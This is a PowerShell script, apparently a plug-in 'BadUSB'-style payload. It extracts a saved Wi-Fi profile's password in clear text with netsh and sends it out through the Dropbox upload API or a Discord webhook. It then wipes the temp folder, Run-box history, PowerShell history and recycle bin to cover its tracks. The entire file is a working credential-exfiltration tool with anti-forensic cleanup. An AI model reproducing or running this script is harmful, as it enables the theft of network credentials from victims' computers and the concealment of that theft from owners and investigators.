############################################################################################################################################################

# Extract a single Wi-Fi profile
$ssid = "Ar"  # Replace "Ar" with the name of the specific SSID you want to extract

$wifiProfile = (netsh wlan show profile name="$ssid" key=clear) | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$ssid;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

$wifiProfile > $env:TEMP/wifi-profile-$ssid.txt

############################################################################################################################################################

# Upload output file to Dropbox
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/wifi-profile-$ssid.txt}

############################################################################################################################################################

# Upload file to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/wifi-profile-$ssid.txt"}

############################################################################################################################################################

# Clean up exfiltration traces
function Clean-Exfil { 
    # Empty temp folder
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

    # Delete run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Delete PowerShell history
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Empty recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}

RI $env:TEMP/wifi-profile-$ssid.txt
